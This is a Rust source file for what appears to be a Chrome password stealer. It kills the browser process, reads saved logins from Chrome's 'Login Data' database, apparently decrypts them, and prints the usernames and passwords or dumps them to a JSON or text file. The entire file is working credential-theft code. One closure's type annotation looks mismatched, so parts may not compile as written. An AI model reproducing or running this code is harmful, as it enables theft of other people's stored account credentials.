use crate::models::{ChromeAccount, DecryptedAccount};
use crate::rayon::iter::ParallelIterator;
use app_dirs::{get_app_dir, AppDataType, AppInfo};
use rayon::iter::{IntoParallelIterator, IntoParallelRefMutIterator};
use rusqlite::{Connection, Error, NO_PARAMS};
use serde_json::to_string_pretty;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::process::Command;

const STMT: &str = "SELECT action_url, username_value, password_value FROM logins";

pub fn close_chrome() {
    Command::new("taskkill")
        .args(&["/F", "/IM", "chrome.exe"])
        .output()
        .expect("There was an error closing google chrome!");
}

fn find_chrome_path() -> Box<Path> {
    let app_info = AppInfo {
        name: "Chrome",
        author: "Google",
    };

    let path_buf = get_app_dir(
        AppDataType::UserCache,
        &app_info,
        "User Data/Default/Login Data",
    )
    .expect("No chrome found!");

    path_buf.into_boxed_path()
}

fn query_accounts() -> Result<Vec<ChromeAccount>, Error> {
    let db_url = find_chrome_path();
    let conn = Connection::open(db_url).expect("Login Data not found!");
    let mut stmt = conn.prepare(STMT)?;

    let chrome_accounts = stmt
        .query_map(NO_PARAMS, |row| {
            Ok(ChromeAccount::new(row.get(0)?, row.get(1)?, row.get(2)?))
        })
        .unwrap()
        .map(|acc| acc.unwrap())
        .collect();

    return Ok(chrome_accounts);
}

pub fn dump(filename: &str, format: String, is_print: bool, is_dump: bool) {
    let mut accounts: Vec<DecryptedAccount> = query_accounts()
        .unwrap()
        .into_par_iter()
        .filter(|acc| !acc.password_value.is_empty() && !acc.website.is_empty())
        .map(|acc| acc.into())
        .collect();

    let (ser, final_filename) = if format.eq("JSON") {
        let mut final_file = filename.to_string();
        final_file.push_str(".json");
        (to_string_pretty(&accounts).unwrap(), final_file)
    } else {
        let end = accounts
            .into_par_iter()
            .map(|acc: &mut DecryptedAccount| format!("{:?}\r\n", acc))
            .collect();

        let mut final_file = filename.to_string();
        final_file.push_str(".txt");
        (end, final_file)
    };

    if is_print {
        println!("{}", &ser);
    }

    if is_dump {
        let mut file = File::create(final_filename).expect("Unable to create file");
        let res = file.write_all(ser.as_bytes());
        match res {
            Ok(_) => println!("Dumped!"),
            Err(_) => panic!("Dump failed!"),
        };
    }
}
